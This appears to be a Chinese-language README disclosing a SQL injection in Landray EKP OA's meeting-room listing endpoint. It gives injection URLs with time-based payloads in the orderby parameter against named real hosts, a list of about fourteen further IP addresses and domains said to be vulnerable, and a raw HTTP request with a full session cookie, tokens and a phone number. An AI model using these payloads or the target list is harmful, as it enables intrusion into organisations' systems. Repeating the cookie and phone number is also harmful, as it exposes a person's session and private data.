# landray
Landray SQL injection
蓝凌数字OA(EKP) SQL注入
一.测试流程：
1.	寻找蓝凌OA官网，申请试用
2.	使用他给出的demo环境即可
3.	登录后台获取cookie（文本末尾有poc）
4.	替换cookie，和Referer的域名即可
部分纯在sql注入
 
会议处
二、成功案例（3个）：
漏洞链接：
http://oa.wanxinbd.com:8081/km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&method=listUse&orderby=(CASE WHEN (8233=8233) THEN SLEEP(5) ELSE 8233 END)&ordertype=down&s_ajax=true
 
漏洞链接：
http://demo.landray.com.cn:80/km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&method=listUse&orderby=(CASE WHEN (2387=2387) THEN SLEEP(5) ELSE 2387 END)&ordertype=down&s_ajax=true
 
漏洞链接：
http://120.79.196.195:8888/km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&method=listUse&orderby=extractvalue*&ordertype=down&s_ajax=true
 
三、其他相同案例地址
112.90.231.18:8080
58.215.18.51:9090
oa.viechina.com:8080
58.62.112.51:8080
ytoa.qygtyz.com:8081
183.237.138.87:8081
222.180.199.38:9000
121.33.203.206:7001
https://120.132.117.213
114.55.199.141:8080
116.62.164.136:8080
wx.gwqm.com
120.133.134.101
124.71.109.153:8080
 
四.漏洞poc
poc：
GET /km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&method=listUse&orderby=extractvalue*&ordertype=down&s_ajax=true HTTP/1.1
Host: demo.landray.com.cn
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/plain, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: UM_distinctid=176834262ed761-0c5b5c55735def-376b4502-1fa400-176834262ee616; landray_guanjianci=null; landray_sorce=baidupinzhuanwy; landray_danyuan=null; landray_jihua=null; Hm_lvt_d14cb406f01f8101884d7cf81981d8bb=1608520179,1608525630,1608525630,1608525773; Hm_lvt_223eecc93377a093d4111a2d7ea28f51=1608519936,1608520179,1608525630,1608525773; Hm_lpvt_223eecc93377a093d4111a2d7ea28f51=1608525773; Hm_lpvt_d14cb406f01f8101884d7cf81981d8bb=1608525783; Hm_lvt_95f4f43e7aa1fe68a51c44ae4eed925d=1608519954,1608525783; Hm_lpvt_95f4f43e7aa1fe68a51c44ae4eed925d=1608525783; Hm_lvt_22f1fea4412727d23e6a998a4b46f2ab=1608519954,1608525783; Hm_lpvt_22f1fea4412727d23e6a998a4b46f2ab=1608525783; roletype=null; fd_id=176839c6d23f6acdfc18a004288a5027; fd_name=%E7%A8%8D%E7%AD%89; nc_phone=13253438176; LtpaToken=AAECAzVGRTAyODBCNUZFMEQwQ0JsdW9s5mztUTrDQ8jot3LyiEt51Q++eXs=; add_customer=0; JSESSIONID=38A7C560F3359D174F81307661AD8226
Referer: https://demo.landray.com.cn/km/imeeting/km_imeeting_res/index_listuse.jsp?s_path=%E4%BC%9A%E8%AE%AE%E7%AE%A1%E7%90%86%E3%80%80%3E%E3%80%80%E4%BC%9A%E8%AE%AE%E5%AE%A4%E7%AE%A1%E7%90%86%E3%80%80%3E%E3%80%80%E4%BC%9A%E8%AE%AE%E5%AE%A4%E6%9F%A5%E8%AF%A2&s_css=default
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip 

